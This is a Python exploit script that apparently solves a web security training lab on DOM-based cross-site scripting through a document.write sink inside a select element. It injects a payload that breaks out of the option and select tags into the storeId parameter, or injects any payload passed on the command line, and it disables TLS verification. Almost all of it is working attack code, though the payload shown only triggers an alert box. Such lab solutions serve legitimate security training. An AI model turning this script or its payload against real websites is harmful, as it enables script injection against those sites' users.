# DOM XSS in document.write sink using source location.search inside a select element

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	r = s.get(url, verify=False, proxies=proxies)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(url, payload):
	injection_uri = url + payload
	r = requests.get(injection_uri, verify=False, proxies=proxies)
	time.sleep(1)
	print('[+] Using payload:\t%s' % injection_uri)
	return r

def send_xss(s, url, payload):
	stock_path = url + '/product'
	if payload == "SOLUTION":
		xss_payload = '"></option></select><img src=x onerror=alert(1)>'
	else:
		xss_payload = payload
	stock_params = {
		"productId": "1",
		"storeId": xss_payload
	}
	print('[+] Targeted endpoint or query parameter:\n    %s' % stock_path)
	print('[+] Using payload in website field:\t%s' % xss_payload)
	r = s.get(stock_path, params=stock_params, proxies=proxies, verify=False)
	return r

def main():
	print('[+] Lab: DOM XSS in document.write sink using source location.search inside a select element')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com "<test></test>"' % sys.argv[0])
		print('[+] Example: %s https://www.target.com SOLUTION\t(solve the lab)' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		print('[+] Trying send a cross-site scripting attack that reflect the alert function...')
		r = send_xss(s, url, payload)
		if r.status_code == 200:
			r = requests.get(url + '/product?productId=1', proxies=proxies, verify=False)
			if  'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved')
			else:
				print('[+] The Exploit sent the given payload !')
		else:
			print('[-] The Exploit failed <!>')

if __name__ == "__main__":
	main()
